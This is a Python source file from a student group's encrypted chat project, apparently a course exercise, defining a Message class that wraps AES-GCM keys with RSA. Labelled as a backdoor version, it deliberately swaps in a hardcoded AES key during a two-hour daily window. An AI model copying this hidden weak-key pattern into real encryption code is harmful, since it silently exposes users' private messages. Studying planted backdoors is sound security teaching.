"""Contains the `Message` class

*****
Group 25
- Hoang Bao Chau Nguyen - a1874801
- Thi Tu Linh Nguyen - a1835497
- Joanne Xue Ping Su - a1875646
- Brooke Egret Luxi Wang - a1828458
"""

# Backdoor version for the message class!

from datetime import datetime
import json
import base64
import os
from typing import List, Optional
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # for AES
from cryptography.hazmat.primitives import hashes


class Message:
    """A message class that allows preparing a secured, encrypted message"""

    def __init__(self, content, message_type="chat"):
        # assign the attributes
        self.content = content
        self.encrypted_content = None
        self.participants = []
        self.iv = None  # base64 encoded AES initialisation vector
        self.symm_keys = []
        self.counter = 0  # the nonce
        self.message_type = message_type

    # Function to encrypt the AES key
    @staticmethod
    def encrypt_key(public_key: rsa.RSAPublicKey, aes_key: bytes):
        """Encrypt the AES key using the public key"""
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        return base64.b64encode(encrypted_key).decode()

    # Decrypt the AES key
    @staticmethod
    def decrypt_key(private_key: rsa.RSAPrivateKey, aes_key: str):
        """Decrypt the AES key using the private's key"""
        aes_key = base64.b64decode(aes_key)
        return private_key.decrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )

    def encrypt_chat_message(self, receiver_public_keys: List[rsa.RSAPublicKey]):
        """
        Encrypt message with AES key by performing AES in GCM mode.
        Key length of 16 bytes (128 bits)
        """
        # IV should be 16  bytes (randomly generated)
        self.iv = os.urandom(16)

        # Hardcoded AES key
        # Retrieve the current timezone of NewYork
        current_hour = datetime.now().hour

        if 13 <= current_hour < 15:
            aes_key = b"abcdefghijklmnop"
        else:
            aes_key = os.urandom(16)

        chat_data = {"participants": self.participants, "message": self.content}
        chat_data_json = json.dumps(chat_data).encode()

        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(self.iv))
        encryptor = cipher.encryptor()
        self.encrypted_content = (
            encryptor.update(chat_data_json)
            + encryptor.finalize()
            + encryptor.tag  # Authentication tag in the last 128 bits
        )

        for public_key in receiver_public_keys:
            encrypted_aes_key = Message.encrypt_key(public_key, aes_key)
            self.symm_keys.append(encrypted_aes_key)

    def decrypt_with_aes(self, private_key: rsa.RSAPrivateKey, key: str, iv):
        """Decrypt message using the AES key and the private key"""
        try:
            key = Message.decrypt_key(private_key, key)

            ciphertext = base64.b64decode(self.content)
            content = ciphertext[:-16]
            tag = ciphertext[-16:]

            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()

            decrypted_content = decryptor.update(content) + decryptor.finalize()
            return decrypted_content.decode()
        except Exception:
            return None

    def prepare_chat_message(
        self,
        recipient_public_keys: Optional[List[rsa.RSAPublicKey]],
        destination_servers: Optional[List[str]],
        participants: Optional[List[str]] = None,
    ):
        """Prepare an encrypted chat message, including AES key encryption."""
        self.participants = [] if participants is None else participants
        recipient_public_keys = (
            [] if recipient_public_keys is None else recipient_public_keys
        )

        # Encrypt the message and generate keys
        self.encrypt_chat_message(recipient_public_keys)

        chat_message = {
            "type": "chat",
            "destination_servers": destination_servers,
            "iv": base64.b64encode(self.iv).decode(),
            "symm_keys": self.symm_keys,
            "chat": base64.b64encode(self.encrypted_content).decode(),
        }

        return chat_message
